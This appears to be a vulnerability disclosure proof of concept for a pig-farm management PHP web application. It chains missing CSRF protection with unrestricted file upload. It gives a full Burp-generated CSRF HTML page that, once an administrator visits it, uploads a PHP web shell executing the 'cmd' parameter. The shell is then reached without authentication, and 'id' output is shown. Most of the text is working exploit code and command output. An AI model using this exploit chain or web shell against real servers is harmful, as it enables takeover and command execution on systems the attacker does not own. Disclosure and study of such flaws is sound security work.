Because there are no CSRF protections in this web application, you can add a pig via CSRF and leverage the unrestricted file upload functionality combined with the ability to browse to the uploads folder as an unauthenticated user to get code execution on the server.

Generate the CSRF payload:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/HOSTNAMEHERE\/pig\/add-pig.php", true);
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------234457517439707756491935311922");
        xhr.withCredentials = true;
        var body = "-----------------------------234457517439707756491935311922\r\n" + 
          "Content-Disposition: form-data; name=\"pigno\"\r\n" + 
          "\r\n" + 
          "pig1000\r\n" + 
          "-----------------------------234457517439707756491935311922\r\n" + 
          "Content-Disposition: form-data; name=\"weight\"\r\n" + 
          "\r\n" + 
          "100\r\n" + 
          "-----------------------------234457517439707756491935311922\r\n" + 
          "Content-Disposition: form-data; name=\"arrived\"\r\n" + 
          "\r\n" + 
          "2021-04-29\r\n" + 
          "-----------------------------234457517439707756491935311922\r\n" + 
          "Content-Disposition: form-data; name=\"gender\"\r\n" + 
          "\r\n" + 
          "male\r\n" + 
          "-----------------------------234457517439707756491935311922\r\n" + 
          "Content-Disposition: form-data; name=\"status\"\r\n" + 
          "\r\n" + 
          "active\r\n" + 
          "-----------------------------234457517439707756491935311922\r\n" + 
          "Content-Disposition: form-data; name=\"breed\"\r\n" + 
          "\r\n" + 
          "1\r\n" + 
          "-----------------------------234457517439707756491935311922\r\n" + 
          "Content-Disposition: form-data; name=\"remark\"\r\n" + 
          "\r\n" + 
          "Testing CSRF\r\n" + 
          "-----------------------------234457517439707756491935311922\r\n" + 
          "Content-Disposition: form-data; name=\"pigphoto\"; filename=\"test.php\"\r\n" + 
          "Content-Type: text/php\r\n" + 
          "\r\n" + 
          "\x3c?php system($_GET[\'cmd\']); ?\x3e\n" + 
          "\r\n" + 
          "-----------------------------234457517439707756491935311922\r\n" + 
          "Content-Disposition: form-data; name=\"submit\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------234457517439707756491935311922--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
```

Once you coerce the administrator to visit your malicious page it will create a new pig with a malicious webshell as the image. Then you are able to browse to the location of the webshell as an unauthenticated user:

```
http://HOSTNAME/pig/uploadfolder/test.php?cmd=id

uid=1(daemon) gid=1(daemon) groups=1(daemon)
```
